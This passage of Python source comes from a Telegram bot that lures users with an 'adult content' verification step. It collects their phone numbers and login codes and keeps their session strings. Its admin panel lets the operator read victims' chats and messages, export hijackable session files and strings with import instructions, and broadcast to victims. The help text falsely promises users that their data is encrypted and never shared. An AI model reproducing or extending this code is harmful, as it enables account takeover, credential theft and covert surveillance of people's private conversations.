        text += f"👤 **{name}** \n📱 {phone}\n🆔 `{user_id}`\n🕐 {last_access[:16]}\n\n"
        buttons.append([Button.inline(f"👁️ {name[:25]}", f"view_user_{user_id}".encode())])
    
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    
    buttons.append([Button.inline("🔙 Back", b"back_admin")])
    await event.edit(text, buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"view_user_(.+)"))
async def view_user_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Loading...")
    
    user_id = int(event.data.decode().split('_')[2])
    user_info = db.get_user_info(user_id)
    
    if not user_info:
        await event.edit("❌ User not found!")
        return
    
    uid, phone, fname, lname, username, session, age, verified_at, last_access = user_info
    db.update_last_access(uid)
    
    buttons = [
        [Button.inline("💬 View Chats", f"user_chats_{uid}".encode())],
        [
            Button.inline("📱 Session File", f"export_sess_{uid}".encode()),
            Button.inline("🔑 Get String", f"get_str_{uid}".encode())
        ],
        [Button.inline("🗑️ Delete User", f"del_user_{uid}".encode())],
        [Button.inline("🔙 Back", b"admin_list")]
    ]
    
    await event.edit(
        f"👤 **USER DETAILS** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📛 **Name:** {fname} {lname or ''}\n"
        f"🔗 **Username:** @{username or 'None'}\n"
        f"📱 **Phone:** {phone}\n"
        f"🆔 **ID:** `{uid}`\n"
        f"🎂 **Age:** {age}+\n"
        f"📅 **Verified:** {verified_at[:16]}\n"
        f"🕐 **Last Active:** {last_access[:16]}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=buttons
    )

@bot.on(events.CallbackQuery(pattern=b"user_chats_(.+)"))
async def user_chats_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Loading chats...")
    
    user_id = int(event.data.decode().split('_')[2])
    session = db.get_session(user_id)
    
    if not session:
        await event.edit("❌ Session expired!")
        return
    
    dialogs = await get_user_dialogs(session, limit=50)
    
    if not dialogs:
        await event.edit("❌ No chats found!")
        return
    
    text = f"💬 **USER CHATS ({len(dialogs)})** \n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    buttons = []
    
    for dialog in dialogs[:15]:
        chat_type = "👥" if dialog['is_group'] else "📢" if dialog['is_channel'] else "👤"
        unread = f" 📨{dialog['unread_count']}" if dialog['unread_count'] > 0 else ""
        text += f"{chat_type} **{dialog['name']}** {unread}\n"
        buttons.append([Button.inline(f"{chat_type} {dialog['name'][:30]}", f"user_msgs_{user_id}_{dialog['id']}".encode())])
    
    if len(dialogs) > 15:
        text += f"\n... and {len(dialogs) - 15} more"
    
    buttons.append([Button.inline("🔙 Back", f"view_user_{user_id}".encode())])
    await event.edit(text, buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"user_msgs_(.+)_(.+)"))
async def user_msgs_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Loading messages...")
    
    data = event.data.decode().split('_')
    user_id = int(data[2])
    chat_id = int(data[3])
    
    session = db.get_session(user_id)
    if not session:
        await event.edit("❌ Session expired!")
        return
    
    messages = await get_chat_messages(session, chat_id, limit=20)
    
    if not messages:
        await event.edit("❌ No messages!")
        return
    
    text = f"📩 **RECENT MESSAGES ({len(messages)})** \n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for msg in messages[:15]:
        direction = "➡️" if msg['is_outgoing'] else "⬅️"
        text += f"{direction} **{msg['date']}** \n💬 {msg['text'][:150]}\n\n"
    
    await event.edit(text, buttons=[Button.inline("🔙 Back", f"user_chats_{user_id}".encode())])

@bot.on(events.CallbackQuery(pattern=b"export_sess_(.+)"))
async def export_sess_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Generating session file...")
    
    user_id = int(event.data.decode().split('_')[2])
    session_string = db.get_session(user_id)
    
    if not session_string:
        await event.edit("❌ Session not found!")
        return
    
    try:
        session_filename = f'user_{user_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.session'
        session_file, me = await export_session_file(session_string, session_filename)
        
        if not session_file:
            await event.edit("❌ Error creating session file!")
            return
        
        await bot.send_file(
            event.sender_id,
            session_filename,
            caption=(
                f"📱 **SESSION FILE** \n\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"🆔 `{me.id}`\n"
                f"📱 Phone: (hidden)\n\n"
                f" **Usage Instructions:** \n"
                f"📱 Mobile: Copy to Telegram data folder\n"
                f"💻 Desktop: Import in Telegram Desktop\n\n"
                f"⚠️ Keep this file secure!"
            )
        )
        
        # Clean up file
        if os.path.exists(session_filename):
            os.remove(session_filename)
        
        await event.respond("✅ Session file sent to your PM!", buttons=[Button.inline("🔙 Back", f"view_user_{user_id}".encode())])
        
    except Exception as e:
        logger.error(f"Export session error: {e}")
        await event.edit(f"❌ Error: {str(e)[:100]}")

@bot.on(events.CallbackQuery(pattern=b"get_str_(.+)"))
async def get_str_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Generating session string...")
    
    user_id = int(event.data.decode().split('_')[2])
    session_string = db.get_session(user_id)
    
    if not session_string:
        await event.edit("❌ Session not found!")
        return
    
    user_info = db.get_user_info(user_id)
    uid, phone, fname, lname, username, session, age, verified_at, last_access = user_info
    
    session_file = f'session_{user_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    
    with open(session_file, 'w', encoding='utf-8') as f:
        f.write(f"{'='*60}\n")
        f.write(f"TELEGRAM SESSION STRING\n")
        f.write(f"{'='*60}\n\n")
        f.write(f"User Information:\n")
        f.write(f"  Name: {fname} {lname or ''}\n")
        f.write(f"  Phone: {phone}\n")
        f.write(f"  User ID: {user_id}\n")
        f.write(f"  Username: @{username or 'None'}\n")
        f.write(f"  Verified: {verified_at}\n\n")
        f.write(f"{'='*60}\n\n")
        f.write(f"SESSION STRING:\n\n")
        f.write(f"{session_string}\n\n")
        f.write(f"{'='*60}\n\n")
        f.write(f"USAGE:\n")
        f.write(f"- Use this string with Telethon StringSession\n")
        f.write(f"- Keep it secure and private\n")
        f.write(f"- Never share with untrusted parties\n\n")
        f.write(f"Generated: {datetime.now().strftime('%d %B %Y, %H:%M:%S')}\n")
        f.write(f"{'='*60}\n")
    
    await bot.send_file(
        event.sender_id,
        session_file,
        caption=f"🔑 **Session String** \n\n👤 {fname} {lname or ''}\n🆔 `{user_id}`"
    )
    
    # Clean up file
    if os.path.exists(session_file):
        os.remove(session_file)
    
    await event.respond("✅ Session string sent to your PM!", buttons=[Button.inline("🔙 Back", f"view_user_{user_id}".encode())])

@bot.on(events.CallbackQuery(pattern=b"del_user_(.+)"))
async def del_user_confirm(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    user_id = int(event.data.decode().split('_')[2])
    user_info = db.get_user_info(user_id)
    
    if not user_info:
        await event.edit("❌ User not found!")
        return
    
    uid, phone, fname, lname, username, session, age, verified_at, last_access = user_info
    
    await event.edit(
        f"⚠️ **CONFIRM DELETION** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Are you sure you want to delete:\n\n"
        f"👤 {fname} {lname or ''}\n"
        f"📱 {phone}\n"
        f"🆔 `{user_id}`\n\n"
        f"This action cannot be undone!",
        buttons=[
            [Button.inline("✅ Yes, Delete", f"confirm_del_user_{user_id}".encode())],
            [Button.inline("❌ No, Cancel", f"view_user_{user_id}".encode())]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"confirm_del_user_(.+)"))
async def confirm_del_user(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Deleting user...")
    user_id = int(event.data.decode().split('_')[3])
    
    if db.delete_user(user_id):
        await event.edit(
            "✅ **User Deleted Successfully** \n\n"
            "All user data has been removed from the database.",
            buttons=[Button.inline("📋 View Users", b"admin_list")]
        )
    else:
        await event.edit(
            "❌ **Deletion Failed** \n\n"
            "Could not delete user. Please try again.",
            buttons=[Button.inline("🔙 Back", b"admin_list")]
        )

@bot.on(events.CallbackQuery(pattern=b"admin_stats"))
async def admin_stats_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    total = db.get_total_users()
    
    # Get recent activity
    users = db.get_all_users()
    today_count = len([u for u in users if u[6][:10] == datetime.now().strftime('%Y-%m-%d')])
    
    await event.edit(
        f"📊 **STATISTICS** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **Total Users:** {total}\n"
        f"📅 **Today's Signups:** {today_count}\n"
        f"🟢 **Bot Status:** Active\n"
        f"⏰ **Server Time:** {datetime.now().strftime('%H:%M:%S')}\n"
        f"📅 **Date:** {datetime.now().strftime('%d %B %Y')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=[Button.inline("🔙 Back", b"back_admin")]
    )

@bot.on(events.CallbackQuery(pattern=b"back_admin"))
async def back_admin_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    total = db.get_total_users()
    
    await event.edit(
        f"👨‍💼 **ADMIN CONTROL PANEL** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 **Total Verified Users:** {total}\n"
        f"🟢 **Bot Status:** Active\n"
        f"📅 **Date:** {datetime.now().strftime('%d %B %Y')}\n"
        f"⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=[
            [Button.inline("📋 All Users", b"admin_list")],
            [Button.inline("📊 Statistics", b"admin_stats")],
            [Button.inline("🔄 Refresh", b"admin_refresh")]
        ]
    )

# ====================# ==================== CLEANUP & MAINTENANCE ====================

async def cleanup_expired_sessions():
    """Periodically clean up expired login sessions"""
    while True:
        try:
            await asyncio.sleep(300)  # Check every 5 minutes
            
            now = datetime.now()
            expired_users = []
            
            for user_id, session_data in login_sessions.items():
                if (now - session_data['started_at']).total_seconds() > 300:
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                if 'client' in login_sessions[user_id]:
                    await cleanup_session(login_sessions[user_id]['client'])
                del login_sessions[user_id]
                logger.info(f"Cleaned up expired session for user {user_id}")
            
            if expired_users:
                logger.info(f"Cleaned {len(expired_users)} expired sessions")
                
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ==================== BROADCAST FEATURE (ADMIN) ====================

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_command(event):
    """Broadcast message to all users"""
    if not is_admin(event.sender_id):
        await event.respond("⛔ Unauthorized!")
        return
    
    await event.respond(
        "📢 **BROADCAST MESSAGE** \n\n"
        "Reply to this message with the text you want to broadcast to all users.\n\n"
        "⚠️ Use carefully!"
    )

@bot.on(events.NewMessage)
async def broadcast_handler(event):
    """Handle broadcast messages"""
    if not is_admin(event.sender_id):
        return
    
    # Check if it's a reply to broadcast command
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg.text and "BROADCAST MESSAGE" in replied_msg.text:
            broadcast_text = event.text
            
            users = db.get_all_users()
            
            if not users:
                await event.respond("❌ No users to broadcast to!")
                return
            
            await event.respond(
                f"📢 **Broadcasting to {len(users)} users...** \n\n"
                f"This may take a few minutes."
            )
            
            success_count = 0
            failed_count = 0
            
            for user_id, phone, fname, lname, username, age, verified_at, last_access in users:
                try:
                    await bot.send_message(
                        user_id,
                        f"📢 **ANNOUNCEMENT** \n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"{broadcast_text}\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━"
                    )
                    success_count += 1
                    await asyncio.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    logger.error(f"Broadcast error for {user_id}: {e}")
                    failed_count += 1
            
            await event.respond(
                f"✅ **Broadcast Complete!** \n\n"
                f"✅ Sent: {success_count}\n"
                f"❌ Failed: {failed_count}\n"
                f"📊 Total: {len(users)}"
            )

# ==================== STATS COMMAND ====================

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    """Show bot statistics (Admin only)"""
    if not is_admin(event.sender_id):
        return
    
    total_users = db.get_total_users()
    users = db.get_all_users()
    
    # Calculate statistics
    today = datetime.now().strftime('%Y-%m-%d')
    today_count = len([u for u in users if u[6][:10] == today])
    
    # Get last 7 days
    week_count = 0
    for days_ago in range(7):
        date = (datetime.now() - timedelta(days=days_ago)).strftime('%Y-%m-%d')
        week_count += len([u for u in users if u[6][:10] == date])
    
    # Active users (last 24 hours)
    active_count = 0
    for user_id, phone, fname, lname, username, age, verified_at, last_access in users:
        try:
            last_time = datetime.strptime(last_access, '%Y-%m-%d %H:%M:%S')
            if (datetime.now() - last_time).total_seconds() < 86400:
                active_count += 1
        except:
            pass
    
    await event.respond(
        f"📊 **BOT STATISTICS** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **Total Users:** {total_users}\n"
        f"📅 **Today:** {today_count} new users\n"
        f"📆 **This Week:** {week_count} new users\n"
        f"🟢 **Active (24h):** {active_count} users\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🤖 **Bot Info:** \n"
        f"⏰ Uptime: Running\n"
        f"🔄 Sessions: {len(login_sessions)} active\n"
        f"📅 Date: {datetime.now().strftime('%d %B %Y')}\n"
        f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )

# ==================== HELP COMMAND ====================

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    """Show help message"""
    user_id = event.sender_id
    
    if is_admin(user_id):
        await event.respond(
            "👨‍💼 **ADMIN COMMANDS** \n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔹 `/start` - Start bot\n"
            "🔹 `/admin` - Admin panel\n"
            "🔹 `/stats` - View statistics\n"
            "🔹 `/broadcast` - Send message to all users\n"
            "🔹 `/help` - Show this message\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            " **Features:** \n"
            "• View all verified users\n"
            "• Access user chats\n"
            "• Export session files\n"
            "• Get session strings\n"
            "• Delete users\n"
            "• Broadcast messages\n\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        await event.respond(
            "❓ **HELP & SUPPORT** \n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            " **Available Commands:** \n\n"
            "🔹 `/start` - Start verification\n"
            "🔹 `/help` - Show this message\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            " **How to Use:** \n\n"
            "1️⃣ Click 'Verify Now'\n"
            "2️⃣ Enter your phone number\n"
            "3️⃣ Enter verification code\n"
            "4️⃣ Access premium content!\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔒 **Privacy:** \n"
            "Your data is encrypted and secure.\n"
            "We never share your information.\n\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )

# ==================== ERROR HANDLER ====================

@bot.on(events.NewMessage)
async def error_handler(event):
    """Global error handler for unknown commands"""
    user_id = event.sender_id
    text = event.text
    
    # Ignore if user is in login process
    if user_id in login_sessions:
        return
    
    # Ignore if it's a command
    if text and text.startswith('/'):
        # Known commands
        known_commands = ['/start', '/admin', '/help', '/stats', '/broadcast']
        if text.split()[0] not in known_commands:
            await event.respond(
                "❌ **Unknown Command** \n\n"
                "Use /help to see available commands."
            )

# ==================== BOT STATUS CHECK ====================

async def bot_status_check():
    """Periodically check bot status and notify admin"""
    while True:
        try:
            await asyncio.sleep(3600)  # Check every hour
            
            total_users = db.get_total_users()
            active_sessions = len(login_sessions)
            
            if ADMIN_ID:
                await bot.send_message(
                    ADMIN_ID,
                    f"🤖 **BOT STATUS UPDATE** \n\n"
                    f"✅ Bot is running normally\n\n"
                    f"📊 Stats:\n"
                    f"• Users: {total_users}\n"
                    f"• Active Sessions: {active_sessions}\n"
                    f"• Time: {datetime.now().strftime('%H:%M:%S')}\n"
                )
        except Exception as e:
            logger.error(f"Status check error: {e}")

# ==================== MAIN FUNCTION ====================

async def startup():
    """Bot startup tasks"""
    logger.info("="*60)
    logger.info("🚀 Bot Starting...")
    logger.info("="*60)
    
    # Check database connection
    try:
        total_users = db.get_total_users()
        logger.info(f"✅ Database connected - {total_users} users")
    except Exception as e:
        logger.error(f"❌ Database error: {e}")
        return
    
    # Check admin configuration
    if ADMIN_ID:
        logger.info(f"👨‍💼 Admin ID: {ADMIN_ID}")
        try:
            await bot.send_message(
                ADMIN_ID,
                f"🤖 **BOT STARTED** \n\n"
                f"✅ Bot is now online!\n\n"
                f"📊 **Current Stats:** \n"
                f"• Total Users: {total_users}\n"
                f"• Status: Active\n"
                f"• Time: {datetime.now().strftime('%d %B %Y, %H:%M:%S')}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Use /admin to access control panel."
            )
        except Exception as e:
            logger.error(f"⚠️ Could not notify admin: {e}")
    else:
        logger.warning("⚠️ No admin ID configured!")
    
    logger.info("="*60)
    logger.info("✅ Bot is running!")
    logger.info("="*60)
    
    # Start background tasks
    asyncio.create_task(cleanup_expired_sessions())
    asyncio.create_task(bot_status_check())

def main():
    """Main entry point"""
    print("\n" + "="*60)
    print("🔞 ADULT CONTENT BOT")
    print("="*60)
    print()
    
    try:
        # Run startup tasks
        with bot:
            bot.loop.run_until_complete(startup())
            
            print("✅ BOT IS RUNNING!")
            print("Press Ctrl+C to stop")
            print("="*60)
            print()
            
            # Run bot
            bot.run_until_disconnected()
            
    except KeyboardInterrupt:
        print("\n" + "="*60)
        print("🛑 Bot stopped by user")
        print("="*60)
        logger.info("Bot stopped by user")
        
    except Exception as e:
        print(f"\n❌ CRITICAL ERROR: {e}")
        logger.error(f"Critical error: {e}", exc_info=True)
        
    finally:
        # Cleanup
        logger.info("Cleaning up...")
        
        # Close all active sessions
        for user_id, session_data in login_sessions.items():
            if 'client' in session_data:
                try:
                    bot.loop.run_until_complete(
                        cleanup_session(session_data['client'])
                    )
                except:
                    pass
        
        # Close database
        try:
            db.close()
            logger.info("Database closed")
        except:
            pass
        
        print("\n✅ Cleanup complete")
        print("="*60)

# ==================== RUN ====================

if __name__ == '__main__':
    main()
